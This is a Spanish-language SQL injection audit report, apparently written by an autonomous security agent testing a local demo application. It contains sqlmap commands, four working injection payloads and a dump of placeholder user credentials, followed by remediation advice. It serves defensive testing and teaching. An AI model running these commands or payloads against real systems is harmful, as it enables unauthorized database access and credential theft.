# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T12:01:18 UTC  
**Analista:** Agente Autónomo de Seguridad Ofensiva (DAST)  
**Herramienta principal:** sqlmap 1.9.10

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad dinámica (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. El análisis confirmó la presencia de una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. La vulnerabilidad fue explotada con éxito, permitiendo la extracción completa de la base de datos de usuarios, incluyendo credenciales en texto plano.

**Severidad: CRÍTICA (CVSS ~9.8)**

---

## Fase 1: Reconocimiento

Se inspeccionó la URL objetivo con `curl`. La página presenta:
- Un formulario HTML con método `GET`
- Un único campo de entrada: `id` (User ID)
- El formulario envía los datos como parámetros GET a la misma URL

**Vector de entrada identificado:**
```
GET http://web.dev.local:8083/?id=<valor>&Submit=Submit
```

**Tecnología detectada:**
- Servidor web: Apache 2.4.65
- Lenguaje: PHP 8.1.33
- SO del servidor: Linux Debian
- DBMS: MySQL 5 (MariaDB fork)

---

## Fase 2: Descubrimiento (Vulnerability Scanning)

Se ejecutó `sqlmap` contra el parámetro `id`:

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --level=3 --risk=2 -p id
```

**Resultado:** El parámetro `id` fue confirmado como **INYECTABLE** mediante múltiples técnicas:

| Técnica | Título |
|---------|--------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

**Payloads detectados:**

```sql
-- Boolean-based blind
id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -

-- Error-based
id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP

-- Time-based blind
id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE

-- UNION query
id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -
```

---

## Fase 3: Explotación Activa

### 3.1 Extracción de usuario actual y bases de datos

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --current-user --dbs
```

**Resultados:**
- **Usuario actual de BD:** `root@%` *(privilegios máximos)*
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 3.2 Volcado completo de la base de datos `sqli_demo`

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo --tables --dump
```

**Tabla encontrada:** `users`

**Datos extraídos (8 registros):**

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ Las contraseñas se almacenan en **texto plano**, lo que agrava significativamente el impacto.

---

## Hallazgos

### VULN-001: SQL Injection en parámetro `id` (GET)

| Campo | Valor |
|-------|-------|
| **URL afectada** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **Parámetro** | `id` (GET) |
| **Tipo** | SQL Injection (múltiples técnicas) |
| **DBMS** | MySQL 5 / MariaDB |
| **Usuario BD** | root@% |
| **Severidad** | Crítica |
| **Impacto** | Extracción completa de datos, potencial RCE (root en BD) |

---

## Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** sin mitigación alguna. El parámetro `id` no aplica ningún tipo de sanitización ni uso de consultas preparadas. Adicionalmente, la aplicación ejecuta las consultas con el usuario `root` de la base de datos, maximizando el impacto potencial.

Se logró extraer la totalidad de usuarios y contraseñas de la base de datos `sqli_demo`. Las contraseñas se almacenan en texto plano, lo que implica un compromiso inmediato de todas las cuentas.

### Recomendaciones

1. **Usar consultas preparadas (Prepared Statements)** con parámetros enlazados en PHP (`PDO` o `mysqli`).
2. **Principio de mínimo privilegio**: la aplicación no debe conectarse a la BD como `root`.
3. **Almacenar contraseñas con hash seguro** (bcrypt, argon2).
4. **Implementar WAF** para detectar y bloquear intentos de inyección.
5. **Validar y sanitizar** todas las entradas del usuario.
